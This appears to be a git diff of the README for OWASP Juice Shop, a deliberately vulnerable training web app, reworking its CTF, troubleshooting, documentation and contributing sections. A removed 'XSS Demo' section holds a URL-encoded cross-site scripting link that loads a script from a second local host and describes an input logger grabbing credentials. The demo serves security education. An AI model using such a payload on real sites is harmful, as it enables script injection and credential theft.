@@ -194,8 +194,9 @@ For detailed instructions and examples please refer to
 ## CTF-Extension
 
 If you want to run OWASP Juice Shop as a Capture-The-Flag event, we
-recommend you set it up along with a [CTFd](https://ctfd.io) server
-conveniently using the official
+recommend you set it up along with a [CTFd](https://ctfd.io) or
+[FBCTF](https://github.com/facebook/fbctf) server conveniently using the
+official
 [`juice-shop-ctf-cli`](https://www.npmjs.com/package/juice-shop-ctf-cli)
 tool.
 
@@ -203,24 +204,19 @@ For step-by-step instructions and examples please refer to
 [the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
 of our companion guide ebook.
 
-## XSS Demo
+## Troubleshooting [![Gitter](http://img.shields.io/badge/gitter-join%20chat-1dce73.svg)](https://gitter.im/bkimminich/juice-shop)
 
-To show the possible impact of
-[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
-can download this
-[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
-and run `docker-compose up` to start the juice-shop and the
-shake-logger. Assume you received and (of course) clicked
-[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
-and login. Apart from the visual/audible effect, the attacker also
-installed [an input logger](http://localhost:8080/logger.php) to grab
-credentials! This could easily run on a 3rd party server in real life!
+If you need help with the application setup please check our
+[our existing _Troubleshooting_](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/troubleshooting.html)
+guide. If this does not solve your issue please post your specific
+problem or question in the
+[Gitter Chat](https://gitter.im/bkimminich/juice-shop) or on
+[Reddit](https://www.reddit.com/r/owasp_juiceshop).
 
-> We recommend to use Mozilla Firefox for this demo! You can also find a
-> recording of this attack in action on YouTube:
-> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
+:stop_sign: Please avoid opening GitHub issues for support requests or
+questions!
 
-## Additional Documentation
+## Documentation
 
 ### Pwning OWASP Juice Shop [![](https://img.shields.io/leanpub/book/pages/juice-shop.svg)](https://leanpub.com/juice-shop) [![](https://img.shields.io/leanpub/book/sold/juice-shop.svg)](https://leanpub.com/juice-shop) [![Write Goodreads Review](https://img.shields.io/badge/goodreads-write%20review-382110.svg)](https://www.goodreads.com/review/edit/33834308)
 
@@ -245,24 +241,12 @@ also
   HTML5
 * [PDF of the Intro Slide Deck](docs/OWASP%20Juice%20Shop%20-%20An%20intentionally%20insecure%20JavaScript%20Web%20Application.pdf)
 
-## Troubleshooting [![Gitter](http://img.shields.io/badge/gitter-join%20chat-1dce73.svg)](https://gitter.im/bkimminich/juice-shop)
-
-If you need help with the application setup please check exiting
-[troubleshooting resources](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/troubleshooting.html).
-If none solved your issue please post your specific problem or question
-in the [official Gitter Chat](https://gitter.im/bkimminich/juice-shop).
-
 ## Contributing [![GitHub contributors](https://img.shields.io/github/contributors/bkimminich/juice-shop.svg)](https://github.com/bkimminich/juice-shop/graphs/contributors) [![JavaScript Style Guide](https://img.shields.io/badge/code%20style-standard-brightgreen.svg)](http://standardjs.com/) [![Crowdin](https://d322cqt584bo4o.cloudfront.net/owasp-juice-shop/localized.svg)](https://crowdin.com/project/owasp-juice-shop) [![Bountysource Activity](https://img.shields.io/bountysource/team/juice-shop/activity.svg)](https://www.bountysource.com/teams/juice-shop) ![GitHub issues by-label](https://img.shields.io/github/issues/bkimminich/juice-shop/help%20wanted.svg) ![GitHub issues by-label](https://img.shields.io/github/issues/bkimminich/juice-shop/good%20first%20issue.svg)
 
-We are always happy to get new contributors on board! Please check the
-following table for possible ways to do so:
-
-| :question:                                                                                            | :bulb:                                                                                                                                                                                                                                                                                   |
-|:------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| Found a bug? Crashed the app? Broken challenge? Found a vulnerability that is not on the Score Board? | [Create an issue](https://github.com/bkimminich/juice-shop/issues) or [post your ideas in the chat](https://gitter.im/bkimminich/juice-shop)                                                                                                                                             |
-| Want to help with development? Pull requests are highly welcome!                                      | Please refer to the [_Contribute to development_](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/contribution.html) and [_Codebase 101_](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/codebase.html) chapters of our companion guide ebook |
-| Want to help with internationalization?                                                               | Find out how to join our [Crowdin project](https://crowdin.com/project/owasp-juice-shop) in [the _Helping with translations_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/translation.html)                                                       |
-| Anything else you would like to contribute?                                                           | Write an email to juice-shop-project@owasp.org (You have to first [join the mailing list](https://groups.google.com/a/owasp.org/forum/#!forum/juice-shop-project/join))                                                                                                                  |
+We are always happy to get new contributors on board! Please check
+[CONTRIBUTING.md](CONTRIBUTING.md) to learn how to
+[contribute to our codebase](CONTRIBUTING.md#code-contributions) or the
+[translation into different languages](CONTRIBUTING.md#i18n-contributions)!
 
 ## References
 
